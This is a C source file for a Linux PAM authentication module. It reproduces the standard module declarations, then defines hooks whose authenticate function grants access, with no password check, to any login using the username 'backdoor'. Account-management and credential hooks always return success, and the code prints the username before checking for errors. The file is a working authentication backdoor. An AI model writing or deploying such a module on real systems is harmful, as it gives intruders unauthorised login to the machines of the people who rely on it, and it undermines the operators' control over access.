#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#ifdef PAM_STATIC

#define PAM_EXTERN static

struct pam_module {
    const char *name;       /* Name of the module */

    /* These are function pointers to the module's key functions.  */

    int (*pam_sm_authenticate)(pam_handle_t *pamh, int flags,
                   int argc, const char **argv);
    int (*pam_sm_setcred)(pam_handle_t *pamh, int flags,
              int argc, const char **argv);
    int (*pam_sm_acct_mgmt)(pam_handle_t *pamh, int flags,
                int argc, const char **argv);
    int (*pam_sm_open_session)(pam_handle_t *pamh, int flags,
                   int argc, const char **argv);
    int (*pam_sm_close_session)(pam_handle_t *pamh, int flags,
                int argc, const char **argv);
    int (*pam_sm_chauthtok)(pam_handle_t *pamh, int flags,
                int argc, const char **argv);
};

#else /* !PAM_STATIC */

#define PAM_EXTERN extern

#endif /* PAM_STATIC */

/* Lots of files include pam_modules.h that don't need these
 * declared.  However, when they are declared static, they
 * need to be defined later.  So we have to protect C files
 * that include these without wanting these functions defined.. */

#if (defined(PAM_STATIC) && defined(PAM_SM_AUTH)) || !defined(PAM_STATIC)

/* Authentication API's */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv);
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                  int argc, const char **argv);

#endif /*(defined(PAM_STATIC) && defined(PAM_SM_AUTH))
     || !defined(PAM_STATIC)*/

#if (defined(PAM_STATIC) && defined(PAM_SM_ACCOUNT)) || !defined(PAM_STATIC)

/* Account Management API's */
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                int argc, const char **argv);

#endif /*(defined(PAM_STATIC) && defined(PAM_SM_ACCOUNT))
     || !defined(PAM_STATIC)*/

#if (defined(PAM_STATIC) && defined(PAM_SM_SESSION)) || !defined(PAM_STATIC)

/* Session Management API's */
PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags,
                   int argc, const char **argv);

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags,
                    int argc, const char **argv);

#endif /*(defined(PAM_STATIC) && defined(PAM_SM_SESSION))
     || !defined(PAM_STATIC)*/

#if (defined(PAM_STATIC) && defined(PAM_SM_PASSWORD)) || !defined(PAM_STATIC)

/* Password Management API's */
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags,
                int argc, const char **argv);

#endif /*(defined(PAM_STATIC) && defined(PAM_SM_PASSWORD))
     || !defined(PAM_STATIC)*/

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;

	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}
